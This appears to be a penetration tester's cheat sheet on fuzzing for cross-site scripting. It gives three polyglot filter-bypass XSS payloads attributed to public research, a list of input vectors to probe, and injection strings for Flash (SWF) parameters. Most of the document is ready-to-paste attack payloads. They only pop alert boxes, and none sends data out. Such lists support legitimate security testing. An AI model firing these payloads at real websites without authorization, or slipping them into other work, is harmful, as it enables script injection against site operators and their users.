# ￼￼￼Tactical Fuzzing - XSS

## XSS
Core Idea: Does the page functionality display something to the users?
For time sensitive testing the 80/20 rule applies. Many testers use Polyglot payloads. You probably have too!

### Multi-context, filter bypass based polyglot payload #1 (Rsnake XSS Cheat Sheet)

``
';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>
``



### Multi-context, filter bypass based polyglot payload #2 (Ashar Javed XSS Research)

``
 ">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg">
￼￼``

### Multi-context polyglot payload (Mathias Karlsson)

``
" onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
``

## ￼Other XSS Observations

Input Vectors:
- Customizable Themes & Profiles via CSS
- Event or meeting names
- URI based
- Imported from a 3rd party (think Facebook integration)
- JSON POST Values (check returning content type)
- File Upload names
- Uploaded files (swf, HTML, ++)
- Custom Error pages
- fake params - ?realparam=1&foo=bar’+alert(/XSS/)+’
- Login and Forgot password forms

## SWF Parameter XSS

Common Params:
onload, allowedDomain, movieplayer, xmlPath, eventhandler, callback (more on OWASP page)

Common Injection Strings:￼
``
\%22})))}catch(e){alert(document.domain);}//
``

``
"]);}catch(e){}if(!self.a)self.a=!alert(document.domain);//
``

``
"a")(({type:"ready"}));}catch(e){alert(1)}//
``
